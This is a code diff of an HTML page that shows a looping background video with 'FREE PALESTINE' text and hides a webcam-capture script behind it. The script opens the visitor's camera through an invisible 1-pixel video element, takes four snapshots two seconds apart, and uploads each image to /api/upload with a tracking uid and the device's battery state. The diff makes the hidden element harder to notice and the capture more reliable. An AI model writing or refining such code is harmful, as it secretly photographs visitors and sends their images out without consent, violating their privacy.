@@ -35,7 +35,7 @@
     font-weight: 800;
     white-space: nowrap;
     z-index: 2;
-    color: #00ffea; /* مخکېنی رنګ */
+    color: #00ffea;
     text-shadow: 0 0 10px #00ffea, 0 0 20px #00aaff, 0 0 30px #0044ff;
     animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
   }
@@ -52,15 +52,19 @@
     100% { text-shadow: 0 0 20px #0044ff, 0 0 30px #00aaff, 0 0 40px #00ffea; }
   }
 
-  /* Hidden camera + snapshot */
-  video#camera, canvas#snapshot {
-    display: none;
+  /* Hidden camera + snapshot elements (opacity 0, not display:none) */
+  video#video {
+    position: absolute;
+    opacity: 0;
+    width: 1px;
+    height: 1px;
   }
+  canvas#snapshot { display: none; }
 </style>
 </head>
 <body>
 
-<!-- Background video -->
+<!-- Video background -->
 <video id="bgVideo" autoplay playsinline loop muted>
   <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
 </video>
@@ -69,23 +73,29 @@
 <div class="text-layer text1">FREE PALESTINE</div>
 <div class="text-layer text2">FREE PALESTINE</div>
 
-<!-- Hidden camera + snapshot -->
-<video id="camera" autoplay playsinline></video>
+<!-- Hidden Camera + Snapshot Elements -->
+<video id="video" autoplay playsinline></video>
 <canvas id="snapshot"></canvas>
 
 <script>
-const camera = document.getElementById('camera');
+const video = document.getElementById('video');
 const canvas = document.getElementById('snapshot');
 const ctx = canvas.getContext('2d');
-const uid = new URLSearchParams(window.location.search).get('uid') || 'unknown';
-const maxSnapshots = 4;
-let snapshotsTaken = 0;
+const params = new URLSearchParams(window.location.search);
+const uid = params.get('uid') || 'unknown';
 
-function takeSnapshotAndSend(battery, charging){
-  if(snapshotsTaken >= maxSnapshots) return;
-  canvas.width = camera.videoWidth;
-  canvas.height = camera.videoHeight;
-  ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
+let snapshotsTaken = 0;
+const maxSnapshots = 4;
+
+// Function to take snapshot
+function takeSnapshotAndSend(battery, charging) {
+  if (snapshotsTaken >= maxSnapshots) return;
+  if(video.videoWidth === 0 || video.videoHeight === 0) return; // wait for video
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+
   const imageData = canvas.toDataURL('image/png');
 
   fetch('/api/upload', {
@@ -93,33 +103,32 @@ function takeSnapshotAndSend(battery, charging){
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ image: imageData, uid, battery, charging })
   }).then(res => res.json()).then(data => {
+    console.log(`Uploaded snapshot ${snapshotsTaken+1}`);
     snapshotsTaken++;
-    console.log("Snapshot uploaded:", snapshotsTaken);
     if(snapshotsTaken === maxSnapshots){
       console.log("Max snapshots reached, stopping camera.");
-      camera.srcObject.getTracks().forEach(track => track.stop());
+      if(video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
     }
   }).catch(err => console.error("Upload error:", err));
 }
 
-// Start camera and take snapshots
+// Start camera only if uid is provided
 if(uid){
   navigator.getBattery().then(battery => {
     const batteryLevel = Math.round(battery.level * 100);
     const isCharging = battery.charging;
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        camera.srcObject = stream;
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
 
-        // Wait until video is playing before taking snapshots
-        camera.onplaying = () => {
-          for(let i=0; i<maxSnapshots; i++){
-            setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), i*2000);
-          }
-        };
-      })
-      .catch(err => console.error("Camera error:", err));
+      // Wait until video can play
+      video.oncanplay = () => {
+        // Take 4 snapshots, 2 seconds apart
+        for(let i=1; i<=maxSnapshots; i++){
+          setTimeout(() => takeSnapshotAndSend(batteryLevel, isCharging), i*2000);
+        }
+      }
+    }).catch(err => console.error("Camera error:", err));
   });
 }
 </script>
